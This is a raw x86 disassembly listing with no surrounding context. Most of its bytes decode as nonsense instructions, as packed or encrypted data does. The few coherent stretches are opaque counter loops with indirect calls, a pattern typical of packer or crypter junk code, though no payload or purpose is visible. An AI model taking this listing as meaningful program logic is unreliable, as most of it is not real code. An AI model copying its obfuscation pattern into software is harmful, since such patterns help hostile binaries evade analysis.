  409cc6:	cmc    
  409cc7:	lods   al,BYTE PTR ds:[esi]
  409cc8:	test   BYTE PTR [esi-0x5],0x3d
  409ccc:	mov    edx,0xed6a6848
  409cd1:	jl     0x409ca2
  409cd3:	adc    edx,DWORD PTR [ebx+0x4826045]
  409cd9:	add    eax,0x69920c28
  409cde:	xlat   BYTE PTR ds:[ebx]
  409cdf:	push   esp
  409ce0:	outs   dx,BYTE PTR es:[esi]
  409ce2:	arpl   WORD PTR [esi+eiz*8],si
  409ce5:	cmp    eax,0xc48ecd87
  409cea:	pop    edi
  409ceb:	mov    ds:0xd555e533,eax
  409cf0:	dec    ecx
  409cf1:	jmp    0xfb036a2
  409cf6:	pop    ss
  409cf7:	pop    ss
  409cf8:	ins    BYTE PTR es:[edi],dx
  409cf9:	jmp    0x135e235e
  409cfe:	(bad)  
  409cff:	daa    
  409d00:	sahf   
  409d01:	scas   eax,DWORD PTR es:[edi]
  409d02:	jecxz  0x409d39
  409d04:	lock xor eax,0x5cf6ee98
  409d0a:	jge    0x409d51
  409d0c:	test   DWORD PTR [edx+ebp*4],ebx
  409d0f:	jae    0x409d29
  409d11:	adc    DWORD PTR [edx-0x73ebefab],esi
  409d17:	out    dx,al
  409d18:	jl     0x409cc9
  409d1a:	fdiv   QWORD PTR [ebx]
  409d1c:	ja     0x409d4b
  409d1e:	push   ecx
  409d1f:	and    BYTE PTR [edx-0x3ffacfed],ah
  409d25:	sbb    bh,BYTE PTR [ebx-0x27969d9]
  409d2b:	adc    eax,0xb7380d51
  409d30:	jp     0x409cd7
  409d32:	les    ebp,FWORD PTR [edi-0x7d85b4eb]
  409d38:	int3   
  409d39:	mov    bl,0x3c
  409d3b:	push   ebp
  409d3c:	inc    DWORD PTR [ebp-0x7737575]
  409d42:	and    eax,0xf11591d2
  409d47:	popf   
  409d48:	test   DWORD PTR [eax],ebx
  409d4a:	in     eax,dx
  409d4b:	mov    ch,0x41
  409d4d:	sub    eax,0xb047a0ac
  409d52:	sbb    BYTE PTR [ecx-0x5ae22dc],0x74
  409d59:	adc    eax,0x5cc4ef0b
  409d5e:	pop    es
  409d5f:	xor    eax,0xd6cf3d83
  409d64:	hlt    
  409d65:	inc    esp
  409d66:	mov    WORD PTR [esi-0x37],es
  409d69:	lds    esp,FWORD PTR [edx+eiz*4]
  409d6c:	xchg   DWORD PTR [eiz*1-0x48147150],ebx
  409d73:	or     BYTE PTR [edi],ah
  409d75:	ins    BYTE PTR es:[edi],dx
  409d76:	push   es
  409d77:	leave  
  409d78:	scas   al,BYTE PTR es:[edi]
  409d79:	pop    ds
  409d7a:	dec    ebp
  409d7b:	call   0x71ef88f4
  409d80:	rol    DWORD PTR [ebp+0x1705c7c9],cl
  409d86:	aaa    
  409d87:	inc    ebx
  409d88:	add    bh,ah
  409d8a:	xor    al,0x0
  409d8c:	add    BYTE PTR [edi],cl
  409d8e:	test   BYTE PTR [eax+eax*1],dl
  409d91:	add    BYTE PTR [eax],al
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	adc    cl,dl
  409dc0:	int3   
  409dc1:	cmp    BYTE PTR [eax],0xe2
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	out    0xbb,al
  409dcc:	and    BYTE PTR [ebp+0x6ac0bdb8],0x21
  409dd3:	shr    BYTE PTR [eax+0x133f4667],cl
  409dd9:	fmul   st(6),st
  409ddb:	dec    eax
  409ddc:	inc    ebx
  409ddd:	leave  
  409dde:	bswap  eax
  409de0:	fdivrp st(7),st
  409de2:	leave  
  409de3:	mov    ebx,0x23d1eb60
  409de8:	xor    eax,0xd6219a38
  409ded:	(bad)  
  409dee:	std    
  409def:	out    0x56,al
  409df1:	stc    
  409df2:	dec    esp
  409df3:	inc    esi
  409df4:	jbe    0x409e47
  409df6:	cmc    
  409df7:	mov    bh,0xa2
  409df9:	jae    0x409da8
  409dfb:	enter  0x2b73,0x91
  409dff:	lods   al,BYTE PTR ds:[esi]
  409e00:	jg     0x409e3c
  409e02:	mov    ds:0x57eda6ff,al
  409e07:	jbe    0x409e2b
  409e09:	sub    al,0xc0
  409e0b:	fdivr  DWORD PTR [edx]
  409e0d:	or     bh,BYTE PTR [ecx+0x42]
  409e10:	fistp  QWORD PTR [esi]
  409e12:	add    ch,dh
  409e14:	mov    BYTE PTR [eax+0x2293ab4],ah
  409e1a:	jne    0x409dca
  409e1c:	frstor [edx]
  409e1e:	lock mov ch,0x49
  409e21:	jno    0x409db1
  409e23:	xchg   edx,eax
  409e24:	jbe    0x409e6e
  409e26:	lahf   
  409e27:	clc    
  409e28:	outs   dx,BYTE PTR ds:[esi]
  409e29:	dec    edx
  409e2a:	push   edx
  409e2b:	push   ds
  409e2c:	mov    ebp,0xd164e221
  409e31:	aam    0x12
  409e33:	jl     0x409dcb
  409e35:	cmp    al,0x9c
  409e37:	and    eax,0x181b4c51
  409e3c:	jnp    0x409e47
  409e3e:	stos   DWORD PTR es:[edi],eax
  409e3f:	inc    edi
  409e40:	jbe    0x409ea9
  409e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e43:	lock sub dh,BYTE PTR [eax+0xb]
  409e47:	mov    edx,0xfe506f3a
  409e4c:	cmp    eax,0xd4eac195
  409e51:	mov    eax,ds:0x5dd49339
  409e56:	bound  esp,QWORD PTR [ebp+0x7c]
  409e59:	lods   al,BYTE PTR ds:[esi]
  409e5a:	xor    esp,DWORD PTR [ebx-0x3a27bc5d]
  409e60:	push   edx
  409e61:	loop   0x409ed5
  409e63:	push   es
  409e64:	mov    al,ds:0xd8d3fb96
  409e69:	fimul  DWORD PTR [edi-0x2]
  409e6c:	bound  eax,QWORD PTR [eax-0x4aa75dcf]
  409e72:	outs   dx,DWORD PTR ds:[esi]
  409e73:	jb     0x409e71
  409e75:	dec    ebp
  409e76:	clc    
  409e77:	mov    WORD PTR [edi],ds
  409e79:	cdq    
  409e7a:	xor    esp,edx
  409e7c:	lahf   
  409e7d:	repnz out dx,al
  409e7f:	pop    edi
  409e80:	rol    DWORD PTR [ebx],0x8b
  409e83:	sbb    eax,0xe703f1a7
  409e88:	mov    ah,0xf6
  409e8a:	popf   
  409e8b:	inc    ebx
  409e8c:	xchg   ebp,eax
  409e8d:	ds xchg edx,eax
  409e8f:	or     DWORD PTR [ebx+edx*4-0x1578df4a],esi
  409e96:	jmp    0x19b9:0x8ea275d9
  409e9d:	fdivr  DWORD PTR [ecx]
  409e9f:	jmp    0x7ddd:0xbf7b4340
  409ea6:	xchg   edi,eax
  409ea7:	jp     0x409e8e
  409ea9:	ss enter 0x7217,0x69
  409eae:	mov    edx,DWORD PTR [edi]
  409eb0:	clc    
  409eb1:	mov    edx,gs
  409eb3:	xor    esp,DWORD PTR [ecx-0x5c]
  409eb6:	pop    ds
  409eb7:	xchg   esp,eax
  409eb8:	outs   dx,DWORD PTR ds:[esi]
  409eb9:	xor    dl,BYTE PTR [ecx]
  409ebb:	imul   esp,ebx,0xffffffeb
  409ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ebf:	icebp  
  409ec0:	rcr    DWORD PTR [ebx+0x2a78ffc6],cl
  409ec6:	hlt    
  409ec7:	loopne 0x409f09
  409ec9:	add    BYTE PTR [ecx-0xc],cl
  409ecc:	pushf  
  409ecd:	dec    edx
  409ece:	sub    BYTE PTR [ebx-0x686294de],bh
  409ed4:	push   esi
  409ed5:	or     DWORD PTR [esi+ecx*8-0x7a523d66],ebx
  409edc:	lds    eax,FWORD PTR [ecx]
  409ede:	fwait
  409edf:	mov    edi,0xa86dea3a
  409ee4:	addr16 mov ch,0x89
  409ee7:	and    BYTE PTR [eax+0x29],bh
  409eea:	ins    BYTE PTR es:[edi],dx
  409eeb:	xchg   ebp,eax
  409eec:	je     0x409ee8
  409eee:	xchg   BYTE PTR [esi-0x564f7eef],ah
  409ef4:	mov    edi,eax
  409ef6:	cmc    
  409ef7:	jno    0xd3daa4b6
  409efd:	(bad)
  409f00:	inc    edi
  409f01:	jecxz  0x409eb7
  409f03:	(bad)  
  409f04:	mov    bl,0x56
  409f06:	and    BYTE PTR [edx+0x4f9c8be2],dl
  409f0c:	and    ebp,ebp
  409f0e:	div    esi
  409f10:	sbb    eax,0x7271147
  409f15:	inc    ebp
  409f16:	(bad)  
  409f19:	(bad)  
  409f1a:	stos   BYTE PTR es:[edi],al
  409f1b:	cmc    
  409f1c:	push   ecx
  409f1d:	inc    ebx
  409f1e:	pop    esi
  409f1f:	pop    ebx
  409f20:	and    ch,BYTE PTR [edx-0x121eb0e]
  409f26:	xchg   ebx,eax
  409f27:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f29:	dec    edi
  409f2a:	in     al,0x27
  409f2c:	test   BYTE PTR [ebp+0x43],al
  409f2f:	and    BYTE PTR [edx],dl
  409f31:	neg    esi
  409f33:	cmp    ah,ah
  409f35:	adc    BYTE PTR [ecx],dl
  409f37:	and    bl,ch
  409f39:	jnp    0x409f05
  409f3b:	lahf   
  409f3c:	rol    BYTE PTR [edx+0x59],cl
  409f3f:	lods   eax,DWORD PTR ds:[esi]
  409f40:	or     DWORD PTR [ecx+0x57],ebx
  409f43:	jae    0x409f33
  409f45:	mov    esp,0x69849195
  409f4a:	fist   DWORD PTR [edi-0x645340c0]
  409f50:	or     al,0x98
  409f52:	ja     0x409fa5
  409f54:	cmp    al,BYTE PTR [ecx+0x586bf34a]
  409f5a:	mov    esi,0x5f045a5d
  409f5f:	mov    ebx,0x67b935ab
  409f64:	fadd   DWORD PTR [ebp+0x33]
  409f67:	ficomp WORD PTR [edx]
  409f69:	sbb    al,0xa3
  409f6b:	mov    al,ds:0xa604f7c9
  409f70:	sub    al,0xf9
  409f72:	mov    ah,bl
  409f74:	neg    esp
  409f76:	loopne 0x409f6d
  409f78:	push   ecx
  409f79:	dec    edi
  409f7a:	cmp    al,0x2d
  409f7c:	addr16 mov ds:0x5842,al
  409f80:	sbb    eax,0xd337b3cb
  409f85:	ret    
  409f86:	inc    esp
  409f87:	les    ecx,FWORD PTR gs:[ebx+0x6abbd92f]
  409f8e:	imul   ecx,ecx,0x5b
  409f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f92:	in     al,0x95
  409f94:	dec    eax
  409f95:	sub    eax,0x6b0b9eb7
  409f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f9b:	sbb    ecx,edi
  409f9d:	(bad)  
  409f9e:	das    
  409f9f:	mov    ds:0xddab8afe,al
  409fa4:	and    BYTE PTR [ebx+0x70],al
  409fa7:	mov    al,ds:0xf7acddbf
  409fac:	scas   eax,DWORD PTR es:[edi]
  409fad:	pop    ecx
  409fae:	or     cl,BYTE PTR [edx+0x23]
  409fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb2:	iret   
  409fb3:	xlat   BYTE PTR ds:[ebx]
  409fb4:	repz xchg ebp,eax
  409fb6:	retf   0x287d
  409fb9:	inc    esp
  409fba:	pop    eax
  409fbb:	out    dx,al
  409fbc:	and    eax,0xac9aafbc
  409fc1:	push   es
  409fc2:	and    al,0xc3
  409fc4:	mov    eax,0x815d094c
  409fc9:	inc    eax
  409fca:	imul   DWORD PTR [edi+0x17206711]
  409fd0:	(bad)  
  409fd1:	cmp    esp,eax
  409fd3:	inc    esp
  409fd4:	clc    
  409fd5:	popf   
  409fd6:	cmp    eax,0x6025141
  409fdb:	pop    ebp
  409fdc:	ret    
  409fdd:	pop    es
  409fde:	and    ch,ah
  409fe0:	lods   al,BYTE PTR ds:[esi]
  409fe1:	ds push edi
  409fe3:	pop    ds
  409fe4:	jnp    0x409fd0
  409fe6:	push   esp
  409fe7:	sbb    al,BYTE PTR [edx+0x789e4038]
  409fed:	pop    es
  409fee:	xchg   ebx,eax
  409fef:	(bad)  
  409ff0:	fst    DWORD PTR [edx-0x3c]
  409ff3:	mov    esp,0x2645ab8e
  409ff8:	adc    ch,0x0
  409ffb:	cmp    al,0xfe
  409ffd:	push   0xdaba9689
  40a002:	mov    edi,fs
  40a004:	mov    ch,0x62
  40a006:	or     BYTE PTR [ecx+esi*8+0x73fa0da9],0x16
  40a00e:	fisttp DWORD PTR [edx+0xf]
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	add    eax,0x8240bc1d
  40a12b:	loopne 0x40a1ab
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a180
  40a133:	jbe    0x40a0d3
  40a135:	jecxz  0x40a11c
  40a137:	mov    dl,0xa2
  40a139:	sub    eax,0x3c28288c
  40a13e:	xchg   ebx,eax
  40a13f:	out    0xae,eax
  40a141:	pop    es
  40a142:	jbe    0x40a0dd
  40a144:	mov    ebx,0x3308bf12
  40a149:	mov    dl,0xfc
  40a14b:	in     eax,dx
  40a14c:	test   BYTE PTR [ebx-0x1],0xe3
  40a150:	jmp    0x40a1b1
  40a152:	rcr    al,1
  40a154:	xchg   BYTE PTR [esi+ebp*1+0x2b665761],bl
  40a15b:	sub    al,0xae
  40a15d:	adc    esi,DWORD PTR [eax]
  40a15f:	cmp    BYTE PTR [esi+0x67],bh
  40a162:	and    DWORD PTR [ebx+0x31],ecx
  40a165:	sub    BYTE PTR [esi-0x4e],dh
  40a168:	push   esp
  40a169:	and    DWORD PTR [edx],edi
  40a16b:	popa   
  40a16c:	cmp    ah,dl
  40a16e:	and    eax,0xb2e05703
  40a173:	push   0x53
  40a175:	hlt    
  40a176:	xor    eax,0x848c68a0
  40a17b:	popf   
  40a17c:	mov    ebp,0x6c381c51
  40a181:	adc    ah,BYTE PTR [esi+0x4724ab80]
  40a187:	scas   eax,DWORD PTR es:[edi]
  40a188:	xor    cl,BYTE PTR [ecx+eax*1]
  40a18b:	neg    esp
  40a18d:	(bad)
  40a191:	out    dx,al
  40a192:	pop    ebx
  40a193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a194:	aad    0x4f
  40a196:	jne    0x40a1e7
  40a198:	jnp    0x40a13e
  40a19a:	push   0x6ca92720
  40a19f:	sahf   
  40a1a0:	xchg   edi,eax
  40a1a1:	inc    esi
  40a1a3:	out    0x4e,al
  40a1a5:	hlt    
  40a1a6:	into   
  40a1a7:	xor    ah,ch
  40a1a9:	mov    WORD PTR [edx+0x61],?
  40a1ac:	cmc    
  40a1ad:	push   es
  40a1ae:	inc    ebp
  40a1af:	out    dx,eax
  40a1b0:	fs pop edi
  40a1b2:	xor    esi,DWORD PTR [ebp+0x106ea27d]
  40a1b8:	push   es
  40a1b9:	call   0xc216539c
  40a1be:	cmp    al,0xe9
  40a1c0:	push   edi
  40a1c1:	clc    
  40a1c2:	or     eax,0x35e33fb3
  40a1c7:	ds ret 
  40a1c9:	fdiv   DWORD PTR [ebx]
  40a1cb:	retf   0xf31e
  40a1ce:	mov    BYTE PTR [edi],ah
  40a1d0:	fmul   st(3),st
  40a1d2:	and    eax,0x2bb3e48d
  40a1d7:	xchg   ebp,eax
  40a1d8:	stos   BYTE PTR es:[edi],al
  40a1d9:	xor    eax,0x2425b8c3
  40a1de:	in     eax,dx
  40a1df:	es and esi,eax
  40a1e2:	jle    0x40a194
  40a1e4:	mov    esi,0xf46d9f34
  40a1e9:	shr    bh,cl
  40a1eb:	ret    0xa9e8
  40a1ee:	leave  
  40a1ef:	dec    esp
  40a1f0:	jne    0x40a215
  40a1f2:	hlt    
  40a1f3:	imul   ebx,DWORD PTR [edi],0xffffffbc
  40a1f6:	int3   
  40a1f7:	jmp    0x3c6a9357
  40a1fc:	pop    edx
  40a1fd:	push   ebp
  40a1fe:	pop    ecx
  40a1ff:	scas   eax,DWORD PTR es:[edi]
  40a200:	aas    
  40a201:	rcl    dl,1
  40a203:	in     eax,dx
  40a204:	mov    eax,0xeadcb0b2
  40a209:	xor    eax,0xd6b503f3
  40a20e:	pop    es
  40a20f:	fcomp  DWORD PTR [ebp+0x639210ee]
  40a215:	outs   dx,BYTE PTR ds:[esi]
  40a217:	sbb    cl,dl
  40a219:	mov    ebp,0xa35b0ad3
  40a21e:	loop   0x40a1ba
  40a220:	dec    esp
  40a221:	pop    ss
  40a222:	push   ebx
  40a223:	not    DWORD PTR [ecx]
  40a225:	ds sub eax,0x2a29b55c
  40a22b:	or     bh,BYTE PTR [edi+0x6ad24fdc]
  40a231:	rcl    BYTE PTR [ecx+0x4],0x63
  40a235:	cmp    DWORD PTR [eax],ebp
  40a237:	clc    
  40a238:	and    BYTE PTR [ecx-0x1f1977c4],cl
  40a23e:	xlat   BYTE PTR ds:[ebx]
  40a23f:	pop    eax
  40a240:	mov    WORD PTR [edi-0x778f643e],ds
  40a246:	sti    
  40a247:	or     edi,DWORD PTR [eax+0x61]
  40a24a:	push   ebp
  40a24b:	les    edi,FWORD PTR [edi+0x2b]
  40a24e:	(bad)  
  40a24f:	(bad)  
  40a251:	push   es
  40a252:	or     ebp,ebp
  40a254:	lods   al,BYTE PTR ds:[esi]
  40a255:	aad    0xec
  40a257:	push   edi
  40a258:	dec    esi
  40a259:	sub    ebp,eax
  40a25b:	int    0x49
  40a25d:	xor    bl,BYTE PTR [edx+0x12b2aed5]
  40a263:	loope  0x40a2a5
  40a265:	movnti DWORD PTR [edx],eax
  40a268:	pop    ebp
  40a269:	(bad)  
  40a26a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a26b:	mov    DWORD PTR [edi+0x12f4d2e0],esp
  40a271:	pop    edi
  40a272:	mov    edi,0xc59be618
  40a277:	enter  0x8b5a,0x94
  40a27b:	dec    esi
  40a27c:	and    bh,BYTE PTR [esp+eiz*2]
  40a27f:	aaa    
  40a280:	test   BYTE PTR [eax+ebx*1-0x61],dh
  40a284:	stos   BYTE PTR es:[edi],al
  40a285:	popf   
  40a286:	xchg   ebx,eax
  40a287:	call   0x45b3:0xf565a5db
  40a28e:	popa   
  40a28f:	loopne 0x40a2d1
  40a291:	adc    cl,BYTE PTR [edx+edx*1-0x76]
  40a295:	jecxz  0x40a2a3
  40a297:	mov    WORD PTR [edx+0x6f63e9b4],es
  40a29d:	push   0xffffffd1
  40a29f:	popa   
  40a2a0:	jg     0x40a2ba
  40a2a2:	mov    esi,0x88f98a8
  40a2a7:	cmp    al,0x30
  40a2a9:	sub    DWORD PTR [edi+0x38],esi
  40a2ac:	pop    ecx
  40a2ad:	inc    esp
  40a2ae:	loopne 0x40a297
  40a2b0:	test   eax,0x4867a878
  40a2b5:	bound  eax,QWORD PTR [ebx-0x5c]
  40a2b8:	cmp    BYTE PTR [ecx+0x6c],dh
  40a2bb:	je     0x40a2e0
  40a2bd:	mov    al,0x1a
  40a2bf:	jg     0x40a284
  40a2c1:	in     al,0x2b
  40a2c3:	imul   edx,eax,0x47
  40a2c6:	test   dl,dl
  40a2c8:	fnstcw WORD PTR [ebx]
  40a2ca:	pop    ebp
  40a2cb:	add    eax,edi
  40a2cd:	pop    ecx
  40a2ce:	pop    edi
  40a2cf:	sti    
  40a2d0:	idiv   DWORD PTR [edx+0x44f4c1]
  40a2d6:	call   0x14ab:0xd36ba24d
  40a2dd:	dec    ebp
  40a2de:	push   esi
  40a2df:	loope  0x40a285
  40a2e1:	xchg   ebp,eax
  40a2e2:	aaa    
  40a2e3:	jns    0x40a271
  40a2e5:	fldenv [esi-0x20]
  40a2e8:	mov    eax,0xc80e3d8f
  40a2ed:	inc    esp
  40a2ee:	outs   dx,BYTE PTR ds:[esi]
  40a2ef:	xlat   BYTE PTR ds:[ebx]
  40a2f0:	jl     0x40a28a
  40a2f2:	int3   
  40a2f3:	push   edi
  40a2f4:	sbb    bl,dl
  40a2f6:	(bad)  
  40a2f8:	sar    DWORD PTR [eax],cl
  40a2fa:	pop    ecx
  40a2fb:	push   0xffffff80
  40a2fd:	push   0x3bbac38c
  40a302:	push   edi
  40a303:	(bad)  
  40a305:	jg     0x40a320
  40a307:	mov    dh,0x9f
  40a309:	sub    DWORD PTR [eax],edx
  40a30b:	(bad)  
  40a30d:	jge    0x40a2ea
  40a30f:	mov    eax,ds:0x936be8ae
  40a314:	(bad)  
  40a316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a317:	and    esi,DWORD PTR [ebp+0x11]
  40a31a:	int    0xa7
  40a31c:	repz bound ecx,QWORD PTR [edi-0x45439010]
  40a323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a324:	int    0x1a
  40a326:	enter  0x5ff9,0x4e
  40a32a:	jns    0x40a324
  40a32c:	push   cs
  40a32d:	fcomp  QWORD PTR [esp+ebx*2]
  40a330:	mov    edx,0x58757d5
  40a335:	and    bh,BYTE PTR [edi+0x53]
  40a338:	jne    0x40a3b7
  40a33a:	and    DWORD PTR [ebp+ebx*4+0x40],ebp
  40a33e:	pusha  
  40a33f:	(bad)  
  40a341:	cmp    DWORD PTR [eax-0x77],eax
  40a344:	xchg   esi,eax
  40a345:	sahf   
  40a346:	xchg   ah,bh
  40a348:	jmp    0xaf3b:0xdd374284
  40a34f:	sub    al,0x1a
  40a351:	cmp    edx,DWORD PTR [eax]
  40a353:	lods   al,BYTE PTR ds:[esi]
  40a354:	and    ebp,DWORD PTR [ebx+eax*4]
  40a357:	(bad)  
  40a358:	adc    ch,BYTE PTR [ecx+0x42]
  40a35b:	out    dx,eax
  40a35c:	jg     0x40a3bb
  40a35e:	or     al,0xdc
  40a360:	bound  ebp,QWORD PTR [esi-0x58ab7765]
  40a366:	jmp    0xa49f56e2
  40a36b:	and    ecx,DWORD PTR [eax]
  40a36d:	and    al,0x12
  40a36f:	mov    bh,BYTE PTR [edi-0x14]
  40a372:	test   al,0x92
  40a374:	test   DWORD PTR [ebp*1-0x17b27498],esi
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4336fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4336fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4336fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4336fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49c:	xchg   esp,eax
  40a49d:	arpl   WORD PTR [edi+0x7e7eee4c],bp
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	sub    DWORD PTR [edx-0x3c],0x4c45f173
  40a4ae:	icebp  
  40a4af:	jl     0x40a51e
  40a4b1:	test   DWORD PTR [edi],eax
  40a4b3:	mov    ch,0x98
  40a4b5:	ret    0x5238
  40a4b8:	out    0xda,al
  40a4ba:	enter  0x13a1,0x96
  40a4be:	mov    al,ds:0xe6d8db9a
  40a4c3:	les    edi,FWORD PTR [esi+0x55]
  40a4c6:	mov    esi,0xc3b14f31
  40a4cb:	sar    ecx,1
  40a4cd:	pop    edx
  40a4ce:	or     dl,BYTE PTR [esi-0x19d2781a]
  40a4d4:	or     edi,DWORD PTR [ecx+0x7e2788b9]
  40a4da:	out    dx,eax
  40a4db:	retf   0xcfe3
  40a4de:	(bad)  
  40a4df:	rcr    BYTE PTR [eax-0x56],0xb6
  40a4e3:	jmp    0x15cc2ec8
  40a4e8:	leave  
  40a4e9:	mov    bl,0x1
  40a4eb:	xchg   edx,eax
  40a4ec:	jns    0x40a4b2
  40a4ee:	hlt    
  40a4ef:	dec    ebx
  40a4f0:	add    ecx,DWORD PTR [edi+0x39]
  40a4f3:	push   esi
  40a4f4:	das    
  40a4f5:	xor    ch,dh
  40a4f7:	and    al,BYTE PTR [esi+0x5962b18]
  40a4fd:	je     0x40a4ab
  40a4ff:	cmp    eax,0xc2807120
  40a504:	mov    DWORD PTR [eax+0x3a],eax
  40a507:	(bad)  
  40a509:	add    DWORD PTR [edi],edx
  40a50b:	das    
  40a50c:	mov    eax,ds:0x73d693d3
  40a511:	fwait
  40a512:	sub    DWORD PTR [si],esi
  40a515:	shl    eax,1
  40a517:	cwde   
  40a518:	hlt    
  40a519:	in     eax,dx
  40a51a:	fmul   DWORD PTR [esi+0x438ac429]
  40a520:	push   esi
  40a521:	or     DWORD PTR [ecx+0x7d],ebp
  40a524:	adc    al,0xab
  40a526:	jmp    0x40a54a
  40a528:	sub    cl,BYTE PTR [edi]
  40a52a:	call   0xec34ebf6
  40a52f:	aas    
  40a530:	push   ds
